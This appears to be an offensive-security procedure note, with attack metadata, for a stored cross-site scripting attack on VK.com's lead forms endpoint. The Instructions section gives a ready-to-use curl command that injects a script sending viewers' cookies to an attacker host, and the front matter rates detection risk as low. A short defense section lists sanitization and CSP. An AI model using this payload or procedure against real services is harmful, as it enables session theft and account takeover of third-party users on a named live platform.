---
id: proc-inject-xss-lead-forms
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-post-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:09.476Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-into-Lead-Forms

## Summary

This procedure exploits insufficient input sanitization in VK.com's lead forms application (/lead_forms_app.php) to inject a malicious JavaScript payload into form data, which is stored and later rendered without proper encoding, enabling persistent XSS attacks on viewers.

## Description

The lead forms feature allows users to submit application data, but lacks validation for script tags or event handlers in inputs. An attacker with a valid VK.com account can submit a form containing a payload like `<script>alert(document.cookie)</script>`, which gets stored in the backend database. When administrators or other users view the form responses, the payload executes in their browser context, potentially stealing session tokens or performing other client-side attacks. This targets authenticated users, amplifying impact to account compromise. Prerequisites include a VK.com session and knowledge of form fields.

## Requirements

1. Valid VK.com authenticated session (cookies or token)
2. Knowledge of lead form structure (e.g., via inspection)
3. Attacker-controlled server for data exfiltration
4. Tools like curl for HTTP requests

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding (e.g., htmlspecialchars in PHP)
- Use Content Security Policy (CSP) to block inline scripts
- Monitor for anomalous form submissions with script patterns
- Audit lead form views for unexpected JavaScript execution

## Objectives

1. Persist malicious script in the lead forms storage
2. Ensure payload evades basic filtering
3. Set up for execution on victim interaction

## Instructions

### Step 1: Identify Form Endpoint and Fields

**Context**: Inspect the lead forms page to understand the POST parameters required for submission.

Use browser dev tools or proxy to capture a legitimate form submission, noting fields like 'form_data', 'lead_id', etc.

### Step 2: Craft and Inject Payload

**Context**: Modify the form data to include the XSS payload, targeting a reflected field like user input or message.

**Command** ([[commands/curl-post-xss-payload]]):
```bash
curl -X POST 'https://vk.com/lead_forms_app.php' \
  -d 'lead_id=123&form_data=<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>&submit=1' \
  -H 'Cookie: vk_session=your_session_here' \
  -H 'User-Agent: Mozilla/5.0'
```

> This command submits the payload to the endpoint. Expected output: HTTP 200 with success message; check form admin view for persistence.

### Step 3: Verify Storage

**Context**: Access the lead forms dashboard as an admin or share the form link to confirm the payload is stored unescaped.

View the source of the form response page; look for the raw script tag.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-xss-payload]]

## Tools Used


## Tags

- xss
- injection
- web
